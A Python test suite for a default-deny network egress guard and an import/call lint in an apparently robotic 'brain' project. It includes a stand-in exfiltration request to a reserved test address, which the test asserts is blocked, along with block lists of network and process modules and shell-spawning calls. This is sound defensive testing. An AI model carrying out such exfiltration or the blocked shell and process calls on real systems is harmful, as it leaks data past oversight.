"""The egress allowlist (card P0-06 step 9): default deny, one chokepoint, and a lint that keeps network
and process libraries out of the rest of the brain.

No test here sends anything off this machine: every denied attempt is stopped before a packet leaves,
and the denied destinations are reserved test names and addresses (RFC 2606 `.invalid` / `.example`,
RFC 5737 192.0.2.0/24 and 203.0.113.0/24).
"""

import ast
import asyncio
import logging
import os
import socket
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path

import pytest

from brain import egress
from brain.config import load_config
from brain.egress import EgressDenied, EgressPolicy
from fakes.egress_policy import testing_guard

BRAIN = Path(__file__).resolve().parent.parent / "brain"
POLICY = EgressPolicy.from_hosts(["api.anthropic.com", "speech.example:8443"])
UNLISTED_NAME = "unlisted-host.invalid"
UNLISTED_IP = "192.0.2.1"

# A listener in ANOTHER process, standing in for a local proxy or forwarder. It prints its port, then
# reports whether anything connected to it.
FOREIGN_LISTENER = """
import socket, sys
s = socket.socket(); s.bind(("127.0.0.1", 0)); s.listen(4); s.settimeout(float(sys.argv[1]))
print(s.getsockname()[1], flush=True)
try:
    c, _ = s.accept(); c.settimeout(1)
    try: data = c.recv(300)
    except OSError: data = b""
    print("RECEIVED", data[:60], flush=True)
except TimeoutError:
    print("NOTHING", flush=True)
"""


def run(coro):
    return asyncio.run(asyncio.wait_for(coro, 30))


class ForeignListener:
    def __init__(self, seconds=1.5):
        self.seconds = seconds

    def __enter__(self):
        self.proc = subprocess.Popen([sys.executable, "-I", "-c", FOREIGN_LISTENER, str(self.seconds)],
                                     stdout=subprocess.PIPE, text=True)
        self.port = int(self.proc.stdout.readline())
        return self

    def verdict(self) -> str:
        return self.proc.stdout.readline().strip()

    def __exit__(self, *exc):
        self.proc.kill()
        self.proc.wait()
        self.proc.stdout.close()


# ---- the policy ------------------------------------------------------------------------------------------

def test_config_egress_list_is_default_deny_with_only_the_approved_api():
    policy = EgressPolicy.from_config(load_config())
    assert policy.allowed == frozenset({("api.anthropic.com", 443)}) and policy.local_ports == frozenset()
    assert EgressPolicy.from_config({}).allowed == frozenset()  # no section: nothing is allowed
    assert not EgressPolicy.from_config({}).allows("api.anthropic.com", 443)


def test_policy_matches_exact_host_and_port_only():
    assert POLICY.allows("api.anthropic.com", 443) and POLICY.allows("API.Anthropic.com.", 443)
    assert POLICY.allows("speech.example", 8443) and not POLICY.allows("speech.example", 443)
    for host, port in (("api.anthropic.com", 80), ("evil.api.anthropic.com", 443), ("anthropic.com", 443),
                       ("api.anthropic.com.evil.example", 443), ("xapi.anthropic.com", 443), (UNLISTED_IP, 443)):
        assert not POLICY.allows(host, port), host
        with pytest.raises(EgressDenied):
            POLICY.check(host, port)
    POLICY.check("api.anthropic.com")  # port 443 by default


def test_loopback_is_allowed_by_policy_only_on_named_local_ports():
    """Loopback is not a free pass: a local proxy would forward anywhere. The policy names the local
    ports of other processes that may be dialled; the guard adds the ports this process listens on."""
    none = EgressPolicy()
    probe = EgressPolicy.from_hosts([], local_ports={8765})
    for host in ("127.0.0.1", "127.8.9.10", "::1", "localhost", "LOCALHOST", "::ffff:127.0.0.1"):
        assert egress.is_local(host)
        assert not none.allows(host, 8765) and probe.allows(host, 8765) and not probe.allows(host, 8766), host
    for host in ("0.0.0.0", "192.168.1.20", "10.0.0.1", "localhost.evil.example", "127.0.0.1.evil.example"):
        assert not egress.is_local(host) and not probe.allows(host, 8765), host


def test_policy_entries_must_be_plain_hosts():
    assert EgressPolicy.from_hosts(["192.168.1.50:9090", "[fe80::1]:9090", "Host.Example"]).allowed == frozenset(
        {("192.168.1.50", 9090), ("fe80::1", 9090), ("host.example", 443)})
    for bad in ("*.anthropic.com", "https://api.anthropic.com", "api.anthropic.com/v1", "a b", "", "host:0",
                "host:99999", "host:https", "*", 5, "127.0.0.1:8080", "localhost", "[::1]:3128"):
        with pytest.raises(ValueError):
            EgressPolicy.from_hosts([bad])
    with pytest.raises(ValueError):
        EgressPolicy.from_config({"egress": {"allowed_hosts": "api.anthropic.com"}})
    with pytest.raises(ValueError):
        EgressPolicy.from_hosts([], local_ports={0})


# ---- the guard -------------------------------------------------------------------------------------------

def test_the_test_suite_itself_runs_under_the_guard():
    assert egress.guard_active()


def test_blocking_connections_to_unlisted_destinations_fail(caplog):
    caplog.set_level(logging.WARNING, logger="brain.egress")
    with testing_guard(POLICY):
        with pytest.raises(EgressDenied):
            socket.create_connection((UNLISTED_NAME, 443), timeout=5)
        with pytest.raises(EgressDenied):
            socket.create_connection((UNLISTED_IP, 443), timeout=5)
        with pytest.raises(EgressDenied):
            socket.getaddrinfo(UNLISTED_NAME, 443)
        with pytest.raises(EgressDenied):
            socket.gethostbyname(UNLISTED_NAME)
        with pytest.raises(EgressDenied):  # reverse lookups would tell a DNS server which addresses interest us
            socket.getnameinfo((UNLISTED_IP, 443), 0)
        with pytest.raises(EgressDenied):
            socket.gethostbyaddr(UNLISTED_IP)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
            with pytest.raises(EgressDenied):
                udp.sendto(b"x", (UNLISTED_IP, 9))
            with pytest.raises(EgressDenied):
                udp.connect((UNLISTED_IP, 9))
        with pytest.raises(EgressDenied):  # a listed host on a port that is not listed: refused before any lookup
            socket.create_connection(("speech.example", 443), timeout=5)
    lines = [r.getMessage() for r in caplog.records]
    assert len(lines) >= 9 and all(line.startswith("EGRESS DENIED: ") for line in lines)


def test_asyncio_connections_to_unlisted_destinations_fail():
    """The same through the event loop the brain runs on (on Windows it does not use socket.connect)."""
    async def go():
        for host in (UNLISTED_NAME, UNLISTED_IP):
            with pytest.raises(EgressDenied):
                await asyncio.open_connection(host, 443)
        loop = asyncio.get_running_loop()
        with pytest.raises(EgressDenied):
            await loop.create_datagram_endpoint(asyncio.DatagramProtocol, remote_addr=(UNLISTED_IP, 9))
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
            tcp.setblocking(False)
            with pytest.raises(EgressDenied):
                await loop.sock_connect(tcp, (UNLISTED_IP, 443))
        # An unconnected datagram transport: sendto() does not raise to its caller, asyncio hands the
        # refusal to the protocol instead. Nothing is sent either way.
        errors = []

        class Recorder(asyncio.DatagramProtocol):
            def error_received(self, exc):
                errors.append(exc)

        transport, _ = await loop.create_datagram_endpoint(Recorder, local_addr=("127.0.0.1", 0))
        transport.sendto(b"x", (UNLISTED_IP, 9))
        await asyncio.sleep(0.2)
        transport.close()
        assert len(errors) == 1 and isinstance(errors[0], EgressDenied)
        if sys.platform == "win32":
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
                udp.bind(("127.0.0.1", 0))
                udp.setblocking(False)
                with pytest.raises(EgressDenied):
                    loop._proactor.sendto(udp, b"x", 0, (UNLISTED_IP, 9))

    with testing_guard(POLICY):
        run(go())


def test_websocket_client_to_an_unlisted_host_fails():
    """A real client library (the one the transport uses) is stopped too, without being told about the policy."""
    from websockets.asyncio.client import connect

    async def go():
        for url in (f"ws://{UNLISTED_NAME}:8765/", f"ws://{UNLISTED_IP}:8765/"):
            with pytest.raises(OSError) as e:
                await connect(url, open_timeout=5)
            assert isinstance(e.value, EgressDenied) or "allowlist" in str(e.value)

    with testing_guard(POLICY):
        run(go())


def test_loopback_to_a_port_this_process_listens_on_works_under_an_empty_policy():
    async def go():
        server = await asyncio.start_server(lambda r, w: w.close(), "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        for host in ("127.0.0.1", "localhost"):
            _, writer = await asyncio.open_connection(host, port)
            writer.close()
        with socket.create_connection(("127.0.0.1", port), timeout=5):  # blocking sockets too
            pass
        server.close()

    with testing_guard(EgressPolicy()):
        run(go())  # a fresh event loop also needs its own loopback socket pair: that must keep working


def test_loopback_to_another_process_is_refused_unless_its_port_is_named():
    """The proxy hole found in review: with the guard seeing only "127.0.0.1", a local listener (a proxy,
    an SSH or adb forward) received the traffic and could carry it anywhere."""
    with ForeignListener() as other:
        with testing_guard(POLICY):
            with pytest.raises(EgressDenied, match="loopback port"):
                socket.create_connection(("127.0.0.1", other.port), timeout=5)

            async def go():
                with pytest.raises(EgressDenied):
                    await asyncio.open_connection("localhost", other.port)

            run(go())
        assert other.verdict() == "NOTHING"
    with ForeignListener() as other:  # `python -m brain probe` names the port it dials
        with testing_guard(EgressPolicy.from_hosts([], local_ports={other.port})):
            with socket.create_connection(("127.0.0.1", other.port), timeout=5) as conn:
                conn.sendall(b"hello")
        assert other.verdict().startswith("RECEIVED")


def test_a_proxy_setting_cannot_carry_traffic_out(monkeypatch):
    """Reviewer's probe: HTTP_PROXY pointing at a loopback listener delivered a request for an outside
    address in full. Now the variables are removed at install, and even a client told explicitly to
    use the proxy is stopped at its connection to it."""
    monkeypatch.setenv("HTTP_PROXY", "http://user:secret@127.0.0.1:3128")
    monkeypatch.setenv("https_proxy", "http://127.0.0.1:3128")
    monkeypatch.setenv("NO_PROXY", "example.com")
    monkeypatch.setenv("UNRELATED", "kept")
    removed = egress.strip_proxy_environment()
    assert [n.upper() for n in removed] == ["HTTPS_PROXY", "HTTP_PROXY", "NO_PROXY"] or sorted(
        n.upper() for n in removed) == ["HTTPS_PROXY", "HTTP_PROXY", "NO_PROXY"]
    assert not any(k.upper().endswith("_PROXY") for k in os.environ) and os.environ["UNRELATED"] == "kept"
    assert "secret" not in repr(removed)

    with ForeignListener() as proxy:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": f"http://127.0.0.1:{proxy.port}"}))
        with testing_guard(POLICY):
            with pytest.raises((urllib.error.URLError, OSError)) as e:
                opener.open("http://203.0.113.1/exfil?battery=87&pose=1,2,3", timeout=3)
        assert "allowlist" in str(e.value)
        assert proxy.verdict() == "NOTHING"


def test_addresses_of_a_listed_name_are_allowed_on_its_port_only_and_expire(monkeypatch):
    """After a lookup of an allowlisted name, the addresses it gave are reachable on that name's ports
    and nothing else is, for a limited time. (The resolver is faked: no lookup leaves the machine.)"""
    def fake_resolver(host, port, *args, **kwargs):
        assert host == "api.anthropic.com"
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.0.2.7", port)),
                (socket.AF_INET6, socket.SOCK_STREAM, 6, "", ("2001:db8::7", port, 0, 0))]

    monkeypatch.setattr(egress, "_real_getaddrinfo", fake_resolver)
    with testing_guard(POLICY):
        with pytest.raises(EgressDenied):
            egress._check_address(POLICY, socket.AF_INET, ("192.0.2.7", 443))  # not looked up yet
        assert len(socket.getaddrinfo("api.anthropic.com", 443)) == 2
        egress._check_address(POLICY, socket.AF_INET, ("192.0.2.7", 443))
        egress._check_address(POLICY, socket.AF_INET6, ("2001:db8::7", 443, 0, 0))
        for address in (("192.0.2.7", 80), ("192.0.2.8", 443)):
            with pytest.raises(EgressDenied):
                egress._check_address(POLICY, socket.AF_INET, address)
        clock = egress.time.monotonic()
        monkeypatch.setattr(egress.time, "monotonic", lambda: clock + egress.RESOLVED_TTL_S + 1)
        with pytest.raises(EgressDenied):  # the lookup is too old now
            egress._check_address(POLICY, socket.AF_INET, ("192.0.2.7", 443))
        socket.getaddrinfo("api.anthropic.com", 443)  # a fresh lookup renews it
        egress._check_address(POLICY, socket.AF_INET, ("192.0.2.7", 443))
        monkeypatch.undo()
    with testing_guard(POLICY):  # what was learned does not outlive the policy it was learned under
        with pytest.raises(EgressDenied):
            egress._check_address(POLICY, socket.AF_INET, ("192.0.2.7", 443))


def test_install_is_one_shot_and_cannot_be_widened():
    current = egress._policy
    egress.install_guard(current)  # the same policy again: nothing to do
    with pytest.raises(RuntimeError, match="cannot be changed"):
        egress.install_guard(EgressPolicy.from_hosts(["wider.example"]))
    assert egress._policy is current
    with pytest.raises(TypeError):
        egress.install_guard(["api.anthropic.com"])
    with testing_guard(EgressPolicy.from_hosts(["only.example"])):  # the tests' own way in restores it
        assert egress._policy.allowed == frozenset({("only.example", 443)})
    assert egress._policy is current


def test_the_guard_tests_itself_and_notices_a_gap(monkeypatch, caplog):
    caplog.set_level(logging.WARNING, logger="brain.egress")
    assert egress.self_test() == []  # the guard in force stops both kinds of connection
    assert caplog.records == []  # quietly
    # Simulate asyncio or the socket module changing so that the checks no longer run. The self-test
    # target is moved to a closed loopback port so that the "leak" it detects never leaves the machine.
    with socket.socket() as closed:
        closed.bind(("127.0.0.1", 0))
        target = closed.getsockname()
    monkeypatch.setattr(egress, "SELF_TEST_ADDRESS", target)
    monkeypatch.setattr(egress, "_check_address", lambda *a, **k: None)
    failures = egress.self_test()
    assert len(failures) == 2 and "blocking connect" in failures[0] and "asyncio" in failures[1]


def test_python_dash_m_brain_installs_the_guard_strips_proxies_and_refuses(tmp_path):
    code = ("import os, socket, sys\nfrom brain.__main__ import main\nmain(['info'])\nfrom brain import egress\n"
            "assert egress.guard_active()\n"
            "assert 'HTTP_PROXY' not in os.environ and 'ALL_PROXY' not in os.environ\n"
            "try:\n    socket.create_connection(('unlisted-host.invalid', 443), timeout=5)\n"
            "except egress.EgressDenied:\n    print('DENIED')\n"
            "try:\n    egress.install_guard(egress.EgressPolicy.from_hosts(['wider.example']))\n"
            "except RuntimeError:\n    print('ONE-SHOT')\n")
    env = dict(os.environ, HTTP_PROXY="http://127.0.0.1:3128", ALL_PROXY="socks5://127.0.0.1:1080")
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, cwd=BRAIN.parent, env=env)
    assert out.returncode == 0 and out.stdout.split()[-2:] == ["DENIED", "ONE-SHOT"], out.stdout + out.stderr


def test_probe_may_dial_only_the_loopback_port_it_is_given():
    """`probe` is the one command that connects to another local process; other hosts need an [egress] entry."""
    with ForeignListener(seconds=20) as other:
        out = subprocess.run([sys.executable, "-m", "brain", "probe", "--port", str(other.port), "--count", "1"],
                             capture_output=True, text=True, cwd=BRAIN.parent, timeout=60)
        assert "EGRESS DENIED" not in out.stdout + out.stderr  # it got through the guard (and then failed to talk)
    out = subprocess.run([sys.executable, "-m", "brain", "probe", "--host", "192.0.2.1", "--count", "1"],
                         capture_output=True, text=True, cwd=BRAIN.parent, timeout=60)
    assert out.returncode == 1 and "EGRESS DENIED" in out.stdout + out.stderr


# ---- the lint: who may import what -------------------------------------------------------------------------

NETWORK_MODULES = {
    "socket", "_socket", "ssl", "socketserver", "http", "urllib", "urllib3", "requests", "httpx", "httpx2", "httpcore",
    "aiohttp", "websockets", "websocket", "anthropic", "openai", "deepgram", "elevenlabs", "grpc", "pycurl", "aiodns",
    "dns", "ftplib", "smtplib", "poplib", "imaplib", "telnetlib", "xmlrpc", "paramiko", "boto3", "botocore",
    "google", "azure", "zmq", "pika", "redis", "pymongo", "psycopg", "psycopg2", "webbrowser", "smbprotocol", "nntplib",
    "_overlapped", "_winapi", "winreg",
}
UNSAFE_LOADER_MODULES = {"pickle", "_pickle", "cPickle", "cloudpickle", "dill", "marshal", "shelve"}  # H-22: code runs on load
PROCESS_MODULES = {"subprocess", "multiprocessing", "ctypes", "_ctypes", "pty", "pexpect", "sh", "cffi", "_posixsubprocess"}
CONNECT_CALLS = {
    "open_connection", "create_connection", "create_datagram_endpoint", "open_unix_connection",
    "create_unix_connection", "sock_connect", "sock_sendto", "sock_sendall", "connect_ex",
    "system", "popen", "startfile", "posix_spawn", "posix_spawnp", "fork", "forkpty",
    "execl", "execle", "execlp", "execlpe", "execv", "execve", "execvp", "execvpe",
    "spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe",
    "create_subprocess_exec", "create_subprocess_shell", "subprocess_exec", "subprocess_shell",
}
DYNAMIC = {"__import__", "import_module", "exec", "eval", "compile"}  # code or module names built at run time
URL_PARSING_ONLY = {"urllib.parse"}

# Who may import what. Everything not listed here may import none of it.
ALLOWED = {
    "egress.py": NETWORK_MODULES,  # the chokepoint
    "transport/server.py": {"websockets"},  # the loopback link to the body
    "transport/client.py": {"websockets"},
    "transport/link.py": {"websockets"},
    "body/link.py": {"websockets"},  # only its exception type, to notice a dropped link
    "transport/auth.py": {"subprocess", "ctypes"},  # sets the token folder's access list; checks the open handle
    "body/phone.py": {"subprocess"},  # the phone's port forward and pairing
    "obs/launcher.py": {"subprocess"},  # `serve --supervised` starts the brain itself as a child (X-02)
}


YAML_UNSAFE = {"unsafe_load", "unsafe_load_all", "full_load", "full_load_all"}


def unsafe_call_names(node: ast.Call) -> set[str]:
    """Names for calls that load code or run a shell: torch.load, a yaml loader that is not a Safe one, and
    any call with shell= anything but the constant False (H-22)."""
    found: set[str] = set()
    f = node.func
    if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
        if f.value.id == "torch" and f.attr == "load":
            weights_only = [k for k in node.keywords if k.arg == "weights_only"]
            if not (weights_only and isinstance(weights_only[0].value, ast.Constant)
                    and weights_only[0].value.value is True):
                found.add("torch.load")
        elif f.value.id == "yaml":
            if f.attr in YAML_UNSAFE:
                found.add(f"yaml.{f.attr}")
            elif f.attr in ("load", "load_all"):
                loaders = [ast.unparse(k.value) for k in node.keywords if k.arg in ("Loader", "loader")]
                if len(node.args) > 1:
                    loaders.append(ast.unparse(node.args[1]))
                if not any("Safe" in name for name in loaders):
                    found.add(f"yaml.{f.attr}")
    for k in node.keywords:
        if k.arg == "shell" and not (isinstance(k.value, ast.Constant) and k.value.value is False):
            found.add("shell=True")
    return found


def imports_and_calls(source: str) -> tuple[set[str], set[str]]:
    modules, calls = set(), set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            modules |= {a.name for a in node.names}
        elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
            modules.add(node.module)
            modules |= {f"{node.module}.{a.name}" for a in node.names}
        elif isinstance(node, ast.Call):
            calls |= unsafe_call_names(node)
            if isinstance(node.func, ast.Attribute) and node.func.attr in CONNECT_CALLS | (DYNAMIC - {"compile"}):
                calls.add(node.func.attr)  # (a Call's func is also visited below; sets make the repeat harmless)
            elif isinstance(node.func, ast.Name) and node.func.id in CONNECT_CALLS | DYNAMIC:
                calls.add(node.func.id)
        elif isinstance(node, ast.Attribute) and node.attr in CONNECT_CALLS | (DYNAMIC - {"compile"}):
            calls.add(node.attr)  # `re.compile` is fine; the builtin compile() is caught as a bare name below
        elif isinstance(node, ast.Name) and node.id in CONNECT_CALLS | DYNAMIC:
            calls.add(node.id)
    return modules, calls


def lint(root: Path, allowed: dict[str, set[str]]) -> list[str]:
    bad = []
    for path in sorted(root.rglob("*.py")):
        rel = path.relative_to(root).as_posix()
        modules, calls = imports_and_calls(path.read_text(encoding="utf-8-sig"))
        tops = {m for m in modules if m not in URL_PARSING_ONLY and not any(m.startswith(u + ".") for u in URL_PARSING_ONLY)}
        used = {m.split(".")[0] for m in tops} & (NETWORK_MODULES | PROCESS_MODULES | UNSAFE_LOADER_MODULES)
        for module in sorted(used - allowed.get(rel, set())):
            bad.append(f"{rel}: imports {module}")
        if rel != "egress.py":
            bad += [f"{rel}: calls {c}" for c in sorted(calls)]
    return bad


def test_only_the_chokepoint_imports_network_or_process_libraries():
    assert lint(BRAIN, ALLOWED) == []


def test_the_lint_catches_each_way_of_reaching_out(tmp_path):
    cases = {
        "a.py": ("import socket\n", "imports socket"),
        "b.py": ("from anthropic import AsyncAnthropic\n", "imports anthropic"),
        "c.py": ("import httpx2 as httpx\n", "imports httpx2"),
        "d.py": ("from urllib.request import urlopen\n", "imports urllib"),
        "e.py": ("import http.client\n", "imports http"),
        "f.py": ("from websockets.asyncio.client import connect\n", "imports websockets"),
        "g.py": ("import asyncio\nasync def f():\n    await asyncio.open_connection('h', 1)\n", "calls open_connection"),
        "h.py": ("import subprocess\n", "imports subprocess"),
        "i.py": ("import os\nos.system('dir')\n", "calls system"),
        "j.py": ("import importlib\nimportlib.import_module('socket')\n", "calls import_module"),
        "k.py": ("def f():\n    import requests\n", "imports requests"),
        "l.py": ("import _overlapped\n", "imports _overlapped"),
        "m.py": ("exec('import socket')\n", "calls exec"),
        "n.py": ("x = eval('1')\n", "calls eval"),
        "o.py": ("c = compile('1', 'f', 'eval')\n", "calls compile"),
        "p.py": ("import os\nos.execvp('adb', ['adb'])\n", "calls execvp"),
        "q.py": ("import os\nos.spawnlp(0, 'curl', 'curl')\n", "calls spawnlp"),
        "r.py": ("import os\nos.posix_spawn('/bin/sh', [], {})\n", "calls posix_spawn"),
        "s.py": ("async def f(loop, s):\n    await loop.sock_connect(s, ('h', 1))\n", "calls sock_connect"),
        "t.py": ("import ctypes\n", "imports ctypes"),
        "agent/llm.py": ("import anthropic\n", "imports anthropic"),
    }
    (tmp_path / "agent").mkdir()
    for name, (source, _) in cases.items():
        (tmp_path / name).write_text(source)
    (tmp_path / "egress.py").write_text("import socket, ssl\nimport anthropic\n")
    (tmp_path / "ok.py").write_text("from urllib.parse import urlsplit\nimport ipaddress, asyncio, json, re\n"
                                    "p = re.compile('x')\n")
    assert lint(tmp_path, {"egress.py": NETWORK_MODULES}) == sorted(f"{n}: {why}" for n, (_, why) in cases.items())


# ---- H-22: unsafe deserialisation and shell=True; H-07: no test-only hook in the product ------------------------

UNSAFE_CASES = {
    "pk1.py": ("import pickle\n", "imports pickle"),
    "pk2.py": ("from pickle import loads\n", "imports pickle"),
    "pk3.py": ("import _pickle\n", "imports _pickle"),
    "pk4.py": ("import cloudpickle\n", "imports cloudpickle"),
    "pk5.py": ("import dill\n", "imports dill"),
    "ma1.py": ("import marshal\n", "imports marshal"),
    "sh1.py": ("import shelve\n", "imports shelve"),
    "to1.py": ("import torch\nm = torch.load('model.pt')\n", "calls torch.load"),
    "ym1.py": ("import yaml\nd = yaml.load(open('c.yml'))\n", "calls yaml.load"),
    "ym2.py": ("import yaml\nd = yaml.load(x, Loader=yaml.Loader)\n", "calls yaml.load"),
    "ym3.py": ("import yaml\nd = yaml.unsafe_load(x)\n", "calls yaml.unsafe_load"),
    "ym4.py": ("import yaml\nd = yaml.full_load(x)\n", "calls yaml.full_load"),
    "ym5.py": ("import yaml\nd = yaml.load_all(x, Loader=yaml.UnsafeLoader)\n", "calls yaml.load_all"),
    "sk1.py": ("import os\nrun = os.popen\nimport subprocess\nsubprocess.run('dir', shell=True)\n",
               "calls shell=True"),
    "sk2.py": ("def f(sh):\n    helper('x', shell=sh)\n", "calls shell=True"),
    "sk3.py": ("def f(sh):\n    helper('x', shell=1)\n", "calls shell=True"),
    "im1.py": ("m = __import__('socket')\n", "calls __import__"),
    "im2.py": ("import builtins\nm = builtins.__import__('socket')\n", "calls __import__"),
}
SAFE_SOURCES = {
    "ok1.py": "import yaml\nd = yaml.safe_load(x)\n",
    "ok2.py": "import yaml\nd = yaml.load(x, Loader=yaml.SafeLoader)\n",
    "ok3.py": "def f():\n    helper('x', shell=False)\n",
    "ok4.py": "import json\nd = json.load(open('f'))\n",
    "ok5.py": "import torch\nm = torch.load('m.pt', weights_only=True)\n",
}


@pytest.mark.parametrize("name", sorted(UNSAFE_CASES))
def test_each_unsafe_pattern_is_reported(name, tmp_path):
    source, why = UNSAFE_CASES[name]
    (tmp_path / name).write_text(source)
    found = lint(tmp_path, {name: {"subprocess"}})  # subprocess itself is allowed here: only the pattern counts
    assert f"{name}: {why}" in found, found


def test_safe_forms_of_the_same_calls_pass(tmp_path):
    for name, source in SAFE_SOURCES.items():
        (tmp_path / name).write_text(source)
    assert lint(tmp_path, {}) == []


def hook_problems(root: Path) -> list[str]:
    """Anything under `root` that names a test-only hook: `testing_guard`, or an import of the tests' packages."""
    bad = []
    for path in sorted(root.rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8-sig"))
        for node in ast.walk(tree):
            names = []
            if isinstance(node, ast.ImportFrom):
                names = [node.module or ""] + [a.name for a in node.names]
            elif isinstance(node, ast.Import):
                names = [a.name for a in node.names]
            elif isinstance(node, ast.Name):
                names = [node.id]
            elif isinstance(node, ast.Attribute):
                names = [node.attr]
            for n in names:
                if n == "testing_guard" or n.split(".")[0] in ("fakes", "tests", "conftest"):
                    bad.append(f"{path.relative_to(root).as_posix()}:{node.lineno}: names test-only {n!r}")
    return bad


def test_nothing_under_brain_names_a_test_only_hook():
    """T-P0-06-063 (H-07): the egress policy cannot be swapped from product code."""
    assert hook_problems(BRAIN) == []
    assert not hasattr(egress, "testing_guard")


def test_the_hook_lint_catches_planted_imports(tmp_path):
    (tmp_path / "a.py").write_text("from brain.egress import testing_guard\n")
    (tmp_path / "b.py").write_text("from brain import egress\nwith testing_guard(None):\n    pass\n")
    (tmp_path / "c.py").write_text("from fakes import testing_guard\n")
    (tmp_path / "d.py").write_text("import fakes.egress_policy\n")
    (tmp_path / "ok.py").write_text("from brain import egress\negress.guard_active()\n")
    found = hook_problems(tmp_path)
    assert {line.split(":")[0] for line in found} == {"a.py", "b.py", "c.py", "d.py"}
